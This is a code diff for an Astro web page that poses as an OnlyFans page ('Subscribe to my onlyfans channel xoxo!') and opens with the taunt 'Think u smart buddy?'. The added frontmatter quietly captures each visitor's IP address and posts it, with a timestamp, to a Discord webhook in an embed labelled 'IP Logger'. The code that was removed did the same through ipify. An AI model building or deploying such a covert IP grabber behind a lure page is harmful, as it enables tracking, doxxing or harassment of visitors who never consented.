@@ -3,39 +3,45 @@
 import Container from "@/components/Container.astro";
 import Layout from "../layouts/Layout.astro";
 
-// Function to send IP address to Discord webhook
-const sendToDiscord = async (ip: string) => {
-  const webhookUrl = import.meta.env.DISCORD_WEBHOOK_URL; // Replace with your Discord webhook URL
+const ip = Astro.clientAddress;
+const webhookUrl = import.meta.env.DEV ?
+  import.meta.env.DEV_DISCORD_WEBHOOK_URL :
+  import.meta.env.DISCORD_WEBHOOK_URL
 
-  const message = {
-    content: `New visitor IP: ${ip}`,
-  };
-
-  try {
-    await fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(message),
-    });
-  } catch (error) {
-    console.error('Error sending IP to Discord:', error);
-  }
+const embed = {
+  title: 'New Visitor Detected',
+  description: `We got a new visitor on the site. Here’s their IP address: **${ip}**`,
+  color: 0xff0000, // Red color for the embed
+  timestamp: new Date().toISOString(),
+  footer: {
+    text: 'IP Logger',
+  },
+  fields: [
+    {
+      name: 'IP Address',
+      value: ip,
+      inline: true,
+    },
+    {
+      name: 'Timestamp',
+      value: new Date().toLocaleString(),
+      inline: true,
+    },
+  ],
 };
 
-// Fetch IP address and send it to Discord
-const ipPromise = fetch('https://api.ipify.org?format=json')
-  .then(response => response.json())
-  .then(data => {
-    sendToDiscord(data.ip);
-    return data.ip;
-  });
-
-const ip = await ipPromise;
+await fetch(webhookUrl, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify({
+    embeds: [embed],
+  }),
+})
 ---
 
-<Layout title="onlyfans | astro">
+<Layout title="onlyfans | astro" description="Subscribe to my onlyfans channel xoxo!">
   <Container>
     <div class="flex flex-col items-center justify-between text-center">
       <h1>Think u smart buddy?</h1>
